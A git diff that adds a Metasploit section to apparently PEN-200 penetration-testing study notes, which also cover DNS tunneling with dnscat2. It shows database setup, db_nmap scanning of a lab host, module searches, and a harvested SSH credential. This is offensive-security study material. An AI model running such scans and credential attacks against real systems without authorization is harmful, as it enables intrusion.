@@ -74,6 +74,7 @@
   * [Port Forwarding with Windows Tools](#Port-Forwarding-with-Windows-Tools)
 * [Tunneling Through Deep Packet Inspection](#Tunneling-Through-Deep-Packet-Inspection)
   * [DNS Tunneling Theory and Practice](#DNS-Tunneling-Theory-and-Practice)
+* [The Metasploit Framework](#The-Metasploit-Framework)
 
 
 # Useful
@@ -1736,4 +1737,83 @@ dnscat2-server feline.corp
 ~~~ bash
 ./dnscat feline.corp
 ~~~
+
+
+
+# The Metasploit Framework
+
+## Creating and initializing the Metasploit database
+
+~~~ bash
+kali@kali:~$ sudo msfdb init
+[+] Starting database
+[+] Creating database user 'msf'
+[+] Creating databases 'msf'
+[+] Creating databases 'msf_test'
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+~~~
+
+
+## Confirming database connectivity
+
+~~~ bash
+msf6 > db_status
+[*] Connected to msf. Connection type: postgresql.
+~~~
+
+
+
+## Creating workspace pen200
+
+~~~ bash
+msf6 > workspace
+* default
+
+msf6 > workspace -a pen200
+[*] Added workspace: pen200
+[*] Workspace: pen200
+~~~
+
+## Using db_nmap to scan BRUTE2
+
+~~~ bash
+msf6 > db_nmap -A 192.168.50.202
+~~~
+
+
+## Display all discovered services
+
+~~~ bash
+msf6 > services
+msf6 > services -p 8000
+~~~
+
+## Searching for all SMB, SSH auxiliary modules in Metasploit
+
+~~~ bash
+msf6 > search type:auxiliary smb
+msf6 > search type:auxiliary ssh
+~~~
+
+
+## Displaying vulnerabilities identified by Metasploit
+
+~~~ bash
+msf6 auxiliary(scanner/smb/smb_version) > vulns
+~~~
+
+## Displaying all saved credentials of the database
+
+~~~ bash
+msf6 auxiliary(scanner/ssh/ssh_login) > creds
+Credentials
+===========
+
+host            origin          service       public  private    realm  private_type  JtR Format
+----            ------          -------       ------  -------    -----  ------------  ----------
+192.168.50.201  192.168.50.201  2222/tcp (ssh)  george  chocolate         Password  
+~~~
+
+
 
